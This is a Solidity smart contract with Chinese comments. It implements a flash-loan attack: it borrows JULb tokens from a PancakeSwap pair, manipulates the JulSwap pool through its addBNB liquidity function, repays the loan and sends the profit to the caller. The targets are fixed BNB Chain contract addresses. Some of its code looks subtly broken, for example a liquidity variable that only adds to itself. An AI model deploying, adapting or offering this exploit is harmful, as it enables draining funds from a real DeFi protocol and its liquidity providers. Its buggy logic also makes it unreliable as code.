pragma solidity =0.6.2;

import '../uniswap/interfaces/IUniswapV2Router02.sol';
import '../uniswap/interfaces/IERC20.sol';
import '../uniswap/interfaces/IUniswapV2Pair.sol';

import '../julswap/interfaces/IProtocolV2.sol';
import '../julswap/interfaces/IWBNB.sol';

import '../uniswap/libraries/UniswapV2LiquidityMathLibrary.sol';

contract Job {
  address public factory = 0xBCfCcbde45cE874adCB698cC183deBcF17952812;
  address public router = 0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F;
  address public targetRouter = 0xbd67d157502A23309Db761c41965600c2Ec788b2;                    //
  address public targetFactory = 0x553990F2CBA90272390f62C5BDb1681fFc899675;
  address public targetProtocol = 0x41a2F9AB325577f92e8653853c12823b35fb35c4;

  address public TargetToken = 0x32dFFc3fE8E3EF3571bF8a72c0d0015C5373f41D; // need julb
  address public WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c; // need bnb
  address public RelayToken1 = 0x55d398326f99059fF775485246999027B3197955; // 中继币种usdt
  address public RelayToken2 = 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d; // 中继币种usdc

  uint deadline = block.timestamp+1800;
  uint loanTargetAmount;
  uint repayWBNBAmount;
  uint liquidity;

  constructor() public {
      safeApprove(TargetToken,router,uint(-1));
      safeApprove(WBNB,router,uint(-1));
      safeApprove(TargetToken,targetRouter,uint(-1));
      safeApprove(WBNB,targetRouter,uint(-1));
      safeApprove(RelayToken1,router,uint(-1));
      safeApprove(RelayToken2,router,uint(-1));
  }

  

  function go(uint _loanTargetAmount) external {
    IUniswapV2Pair(UniswapV2Library.pairFor(factory, TargetToken, WBNB)).swap(
      uint(0),
      _loanTargetAmount*1000000000000000000,
      address(this),
      bytes('not empty')
    );
  }

  //gogogogogogogogogogogogogogogogogogogogogogogogo
  function uniswapV2Call(
    address _sender,
    uint _zeroAmount,
    uint _loanTargetAmount,
    bytes calldata _data
  ) external {
    storeLoanRepayAmount(_loanTargetAmount);
    // 借到目标代币之后

    // 1. 从目标池子中将全部借来的代币兑换为BNB
    swapTargetTokenForBNB();
    // 2. 一半的BNB添加流动性到目标池子中
    addBNB();
    // 3. 将剩下的BNB从目标池子中全部兑换为目标代币
    swapBNBForTargetToken();
    // 4. 移除目标池子中的流动性
    removeLiquidity();
    // 5. 将手中的目标代币全部通过pancakeswap全部换成BNB并偿还借款
    repayBNB();
    // 6. 将剩下的BNB转移到msg.sender
    transferProfit();

  }

  event StoreLoanRepayAmount(uint amount0,uint amount1);
  function storeLoanRepayAmount(uint _loanTargetAmount) internal {
      loanTargetAmount = _loanTargetAmount;

      address[] memory path = new address[](2);
      path[0] = WBNB;
      path[1] = TargetToken;
      uint[] memory amountsIn = IUniswapV2Router02(router).getAmountsIn(_loanTargetAmount, path);
      repayWBNBAmount = amountsIn[0];

      emit StoreLoanRepayAmount(_loanTargetAmount,amountsIn[0]);
  }

  event SwapTargetTokenForBNB(uint amount0,uint amount1);
  function swapTargetTokenForBNB() internal{
      uint balanceTargetToken = IERC20(TargetToken).balanceOf(address(this));
      
      address[] memory path = new address[](2);
      path[0] = TargetToken;
      path[1] = WBNB;
      
      uint[] memory amounts = IUniswapV2Router02(targetRouter).swapExactTokensForTokens(balanceTargetToken,uint(0), path, address(this), deadline);
      emit SwapTargetTokenForBNB(amounts[0],amounts[1]); 
  }

  // 添加BNB流动性，另一种代币由对方合约添加
  function addBNB() internal{
        uint balanceWBNB = IERC20(WBNB).balanceOf(address(this));
        IWBNB(WBNB).withdraw(balanceWBNB/2);
        (uint256 amountToken, uint256 amountBNB, uint256 _liquidity) = IProtocolV2(targetProtocol).addBNB{
            value: balanceWBNB/2
        }();

        liquidity += liquidity;
  }

  // BNB兑换目标代币
  event SwapBNBForTargetToken(uint amount0,uint amount1);
  function swapBNBForTargetToken() internal{
      uint balanceWBNB = IERC20(WBNB).balanceOf(address(this));
      
      address[] memory path = new address[](2);
      path[0] = WBNB;
      path[1] = TargetToken;
      uint[] memory amounts = IUniswapV2Router02(targetRouter).swapExactTokensForTokens(balanceWBNB,uint(0), path, address(this), deadline);
      emit SwapBNBForTargetToken(amounts[0],amounts[1]);
  }

  
  // 移除流动性
  event RemoveLiquidity(uint amount0,uint amount1);
  function removeLiquidity() internal{
        safeApprove(UniswapV2Library.pairFor(targetFactory, TargetToken, WBNB),router,liquidity);
      
        (uint amount0, uint amount1) = IUniswapV2Router02(targetRouter).removeLiquidity(TargetToken, WBNB,liquidity,0,0,address(this),deadline);
        emit RemoveLiquidity(amount0,amount1);
  }

  // 还款
  function repayBNB() internal{
      uint number = 1;
      if (RelayToken2 != address(0)){
          number = 2;
      }

      uint balanceTargetToken = IERC20(TargetToken).balanceOf(address(this));

      address[] memory path = new address[](3);
      path[0] = TargetToken;
      path[1] = RelayToken1;
      path[2] = WBNB;
      IUniswapV2Router02(router).swapTokensForExactTokens(balanceTargetToken/number,uint(-1), path, address(this), deadline);
      
      if (RelayToken2 != address(0)){
          path[1] = RelayToken2;
          IUniswapV2Router02(router).swapTokensForExactTokens(balanceTargetToken/number,uint(-1), path, address(this), deadline);
      }
      
      IERC20(WBNB).transfer(UniswapV2Library.pairFor(factory, TargetToken, WBNB), repayWBNBAmount);
  }

  // 回收盈利
  function transferProfit() internal{
      uint balanceWBNB = IERC20(WBNB).balanceOf(address(this));
      safeTransferFrom(WBNB,address(this),msg.sender,balanceWBNB);
  }
  
  function safeTransferFrom(address token, address from, address to, uint value) internal {
      (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));
      require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_FROM_FAILED');
  }
    
  function safeApprove(address token, address to, uint value) internal {
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x095ea7b3, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: APPROVE_FAILED');
  }
}